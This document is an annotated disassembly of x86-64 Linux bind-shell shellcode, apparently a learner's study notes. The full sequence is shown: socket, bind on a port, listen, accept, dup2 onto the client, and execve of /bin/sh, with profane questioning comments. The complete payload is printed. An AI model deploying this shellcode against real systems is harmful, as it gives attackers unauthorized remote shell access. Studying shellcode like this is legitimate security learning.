0x0000555555755020 <+0>:	push   0x29
0x0000555555755022 <+2>:	pop    rax                                ; socket syscall number
0x0000555555755023 <+3>:	cdq                                       ; zero rdx using sign extension
0x0000555555755024 <+4>:	push   0x2
0x0000555555755026 <+6>:	pop    rdi                                ; AF_INET
0x0000555555755027 <+7>:	push   0x1
0x0000555555755029 <+9>:	pop    rsi                                ; SOCK_STREAM
0x000055555575502a <+10>:	syscall

; -- socket --
; rax -> 41
; rdi -> 2
; rsi -> 1
; rdx -> 0

; rdi now contains socket returned from socket syscall above
0x000055555575502c <+12>:	xchg   rdi,rax

; check on callee/caller rules for rdx, if it's preserved, my cdq isn't necessary
0x000055555575502e <+14>:	push   rdx

; looks like they rely on encoders instead of blackmagic fuckery to exclude nulls
; why the 2 again???  rewatch this section of the video
0x000055555575502f <+15>:	mov    DWORD PTR [rsp],0x5c110002         ; move port onto stack

0x0000555555755036 <+22>:	mov    rsi,rsp    ; point to structaddr_in
0x0000555555755039 <+25>:	push   0x10
0x000055555575503b <+27>:	pop    rdx        ; 16 bytes for length of structaddr_in
0x000055555575503c <+28>:	push   0x31
0x000055555575503e <+30>:	pop    rax        ; bind syscall number
0x000055555575503f <+31>:	syscall

; -- bind --
; rax -> 49
; rdi -> fd already stored here
; rsi -> pointer to stack (structaddr_in)
; rdx -> 16

0x0000555555755041 <+33>:	push   0x32
0x0000555555755043 <+35>:	pop    rax
0x0000555555755044 <+36>:	syscall           ; listen syscall

; apparently they give zero fucks about backlog, is it known?  callee/caller research again
; -- listen --
; rax -> 50
; rdi -> fd already here
; rsi -> ??????

0x0000555555755046 <+38>:	xor    rsi,rsi
0x0000555555755049 <+41>:	push   0x2b
0x000055555575504b <+43>:	pop    rax        ; accept syscall
0x000055555575504c <+44>:	syscall

; -- accept --
; rax -> 43
; rdi -> fd already here
; rsi -> 0

; accept returns client to rax, store it back in rdi
0x000055555575504e <+46>:	xchg   rdi,rax

0x0000555555755050 <+48>:	push   0x3
0x0000555555755052 <+50>:	pop    rsi

0x0000555555755053 <+51>:	dec    rsi      ; why push 3, pop it, then decrement ??
0x0000555555755056 <+54>:	push   0x21           ; dup2 loop
0x0000555555755058 <+56>:	pop    rax
0x0000555555755059 <+57>:	syscall
0x000055555575505b <+59>:	jne    0x555555755053 <code+51>

; -- dup2 --
; rax -> 33
; rdi -> new client fd here
; rsi -> 2 -> 1 -> 0


0x000055555575505d <+61>:	push   0x3b
0x000055555575505f <+63>:	pop    rax        ; exec syscall
0x0000555555755060 <+64>:	cdq               ; zero out rdx
0x0000555555755061 <+65>:	movabs rbx,0x68732f6e69622f       ; get /bin/sh on stack
0x000055555575506b <+75>:	push   rbx
0x000055555575506c <+76>:	mov    rdi,rsp
0x000055555575506f <+79>:	push   rdx
0x0000555555755070 <+80>:	push   rdi
0x0000555555755071 <+81>:	mov    rsi,rsp
0x0000555555755074 <+84>:	syscall
0x0000555555755076 <+86>:	add    BYTE PTR [rax],al  ???
